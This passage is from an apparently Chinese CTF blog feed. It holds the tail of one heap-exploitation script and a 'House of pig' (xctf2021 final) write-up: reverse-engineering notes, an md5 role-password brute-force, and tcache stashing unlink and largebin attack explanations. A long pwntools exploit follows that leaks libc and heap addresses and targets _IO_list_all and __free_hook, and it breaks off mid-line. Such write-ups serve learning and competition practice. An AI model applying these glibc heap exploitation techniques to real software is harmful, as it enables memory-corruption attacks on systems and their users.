io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment">#fake_stack:</span></span><br><span class="line">payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_rdx)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">io+=payload</span><br><span class="line"></span><br><span class="line">io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span></span><br><span class="line"><span class="comment"># add(7,0x440,cyclic(0x440))</span></span><br><span class="line"><span class="comment"># add(8,0x420,cyclic(0x420))</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span></span><br><span class="line"><span class="comment">#delete(8)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of pig xctf2021final复现</title>
      <link href="/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/"/>
      <url>/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>阴间堆风水</p></blockquote><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="修复switch"><a href="#修复switch" class="headerlink" title="修复switch"></a>修复switch</h3><p>0: 0x3985 invalid</p><p>1: 0x3797 add</p><p>2: 0x37B3 show</p><p>3: 0x37cf edit</p><p>4: 0x37eb delet</p><p>5: 0x3807 change role</p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>通过add函数，猜测出heap_list，heap_size的作用，结合free、edit函数找到两个标志位</p><p>结合每个的大小与偏移，推测出数组的数量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">int</span> size[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag1[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag2[<span class="number">0x18</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_peppasize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_mummysize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_daddysize;</span><br><span class="line">  <span class="type">int</span> show_time;</span><br><span class="line">  <span class="type">int</span> edit_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol><li>填充1个1和n个0,使信息长度为N*512+448(bit)</li><li>用64bit存储填充前信息长度，加在后面，长度变为(N+1)*512</li><li>装入标准的幻数: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li><li>四轮循环运算，循环次数为分组个数(N+1)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment">#s=&#x27;B&#x27;+str(i)</span></span><br><span class="line">            <span class="comment">#s=&#x27;C&#x27;+str(i)</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A39275120</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>add大小0x90~0x430，同一角色size只能增加</li><li>peppa 20次，mummy 10次，daddy 5次</li><li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li><li>view 2次，edit 8次</li><li>delet后无法delet，切换角色可edit、view</li><li>daddy的add不用一直增加！</li><li>daddy add最后一次时会多calloc0xe8</li></ul><h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><h3 id="role的选择"><a href="#role的选择" class="headerlink" title="role的选择"></a>role的选择</h3><p>注意不同role的堆列表是独立的，同时不同role能修改的位置也不同</p><p>peppa可以修改fd,bk</p><p>mummy可以修改fd_nextsize,bk_nextsize</p><p>因而最好peppa打tcache stashing unlink, mummy打largebin attack</p><p>当然这不是绝对的，我们可以通过UAF达到对同一个堆块的混淆</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p><p>2.将<strong>后进</strong><code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为<code>[target-0x10]</code>(即target为将要加入tchache的chunk的user pointer处），同时将目标地址<code>+0x08</code>处（即target-&gt;bk)的值设置为一个指向可写内存的指针。</p><p> 3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p><h3 id="布局的问题"><a href="#布局的问题" class="headerlink" title="布局的问题"></a>布局的问题</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote><p> 在tcache中放了5个的情况下，如何使两个chunk进入<strong>相同大小</strong>的smallbin？</p></blockquote><p>问题转化为：如何使两个chunk进入相同大小的unsortedbin，而不进入tcache</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p><p>考虑当unsortedbin中只有一个chunk时，分配较小的chunk时会从其中切一块使用，另一块放入lastrmainder（同样是unsortedbin）</p><p>所以我们先获取一个较大的unsortedbin，（这一步通过填满tcache获得），随后malloc一块较小的chunk,就可以获得目标大小的unsortedbin</p><p>注意这里最后需要获得两块unsortedbin,注意避免在分配第二块时把第一块拿掉。我一开始分配的大小为0x150,刚好可以拿掉一个0xa0剩下一个0xa0,但是在分配第二快时就会出现问题</p><p>我的解决方案是，切割0x160的块，从中取出0xb0，刚好剩下0xa0,同时第二次取0xb0时不会出现把获得的unsortedbin取走的情况</p><p>网上的解决方案是：再填另一个tcache，两次用不同的unsortedbin切割，但是这种方法比较浪费次数</p><p>同时，经过计算、微调，我这里切下来的smallbin的fd和bk刚好位于chunk1-&gt;7,1-&gt;8的可写区域</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote><p>改到_IO_list_all的指针后，如何修改内容？</p></blockquote><p>本题比较阴间的地方是，不能完整地修改一个堆块</p><p>好在出题人给add3加了一个gift,可以申请一个0xe8的完整可写的堆块</p><p>所以最后可以把largebin attack指向的largebin留着，完成add3的最后一步，使得daddy从这个largechunk中切一块，从而直接获得完整的修改权限</p><p>下策是修改large chunk的chain指针，使其指向可写堆块</p><h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">3</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0xa0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin-&gt;smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0x160</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0x160</span></span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0xa0 to 5</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#split into unsorted bin</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>)<span class="comment">#to clear flag0</span></span><br><span class="line">view(<span class="number">7</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x2204a8</span></span><br><span class="line">iolistall = libc_base + <span class="number">0x21a680</span></span><br><span class="line">memset_got = libc_base + <span class="number">0x219188</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))</span><br><span class="line">log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span></span><br><span class="line">delet(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span></span><br><span class="line"><span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span></span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span></span><br><span class="line">delet(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span></span><br><span class="line">fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x160</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">view(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"><span class="comment">#fix it</span></span><br><span class="line">payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack1</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fix largebin&amp;attck2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7</span></span><br><span class="line"><span class="comment">#fix largebin</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">payload = 